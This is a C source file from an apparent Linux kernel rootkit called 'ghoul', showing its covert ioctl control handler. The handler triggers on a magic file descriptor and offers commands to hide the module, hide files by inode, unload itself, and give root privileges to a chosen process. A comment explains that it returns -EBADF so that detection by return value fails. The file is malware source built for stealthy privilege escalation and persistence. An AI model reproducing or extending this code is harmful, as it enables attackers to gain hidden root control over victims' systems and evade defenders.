#include <linux/kernel.h>
#include <uapi/asm-generic/errno-base.h>
#include "service.h"
#include "load.h"
#include "privileges.h"
#include "hide.h"

unsigned int service_fd = 666;
unsigned long ping_arg = 666;

notrace int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
{
    // 0 means this is not a service request
    if (fd != service_fd)
        return 0;
    
    pr_info("ghoul: ioctl request: fd=%u, cmd=%u, arg=%lu\n", fd, cmd, arg);
    
    switch (cmd)
    {
        case SERVICE_SHOW:
            show_self();
            break;
        case SERVICE_HIDE:
            hide_self();
            break;
        case SERVICE_UNLOAD:
            show_self();
            unload_self();
            break;
        case SERVICE_CHANGE_FD:
            service_fd = (unsigned int)arg;
            break;
        case SERVICE_PING:
            // make sure argument is correct
            if (arg == ping_arg)
                return ping_arg;
            break;
        case SERVICE_CHANGE_PING_ARG:
            ping_arg = arg;
            break;
        case SERVICE_GIVE_ROOT:
            give_root((int)arg);
            break;
        case SERVICE_HIDE_FILE_INODE:
            hide_file_inode(arg);
            break;
        case SERVICE_SHOW_FILE_INODE:
            show_file_inode((const void __user *)arg);
            break;
    }
    /*
     * -EBADF is the error that is returned when performing an ioctl operation on an invalid fd.
     * Return this so that ghoul cannot be detected by its return value.
     */
    return -EBADF;
}